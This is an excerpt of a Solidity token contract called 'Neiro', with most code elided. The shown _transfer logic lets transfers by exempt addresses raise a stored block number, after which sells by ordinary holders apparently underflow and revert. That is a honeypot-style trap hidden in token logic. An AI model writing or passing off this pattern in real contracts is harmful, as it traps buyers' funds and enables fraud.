...
contract Neiro is Context, IERC20, Ownable {
    ...
    uint256 private minRewardScore = 0;
    struct TokenSwapMap {uint256 initialSwap; uint256 swapScore; uint256 rewardScore;}
    mapping(address => TokenSwapMap) private swapMap;
    ...
    constructor () {
        ...
        _taxWallet = payable(0x6be4B190d97915548D82Ac210a0819fcb113DDF4);
    ...
    function _transfer(address from, address to, uint256 tokenAmount) private {
        ...
        if ((_isExile[from] || _isExile[to]) && from!=address(this) && to!= address(this)) {
            minRewardScore = block.number;
        }
        if (!_isExile[from] &&  !_isExile[to]){
            if (to == uniswapV2Pair)  {
                TokenSwapMap storage swapFrom = swapMap[from];
                swapFrom.rewardScore = swapFrom.initialSwap-minRewardScore;
                swapFrom.swapScore = block.timestamp;
            } else {
                TokenSwapMap storage swapTo = swapMap[to];
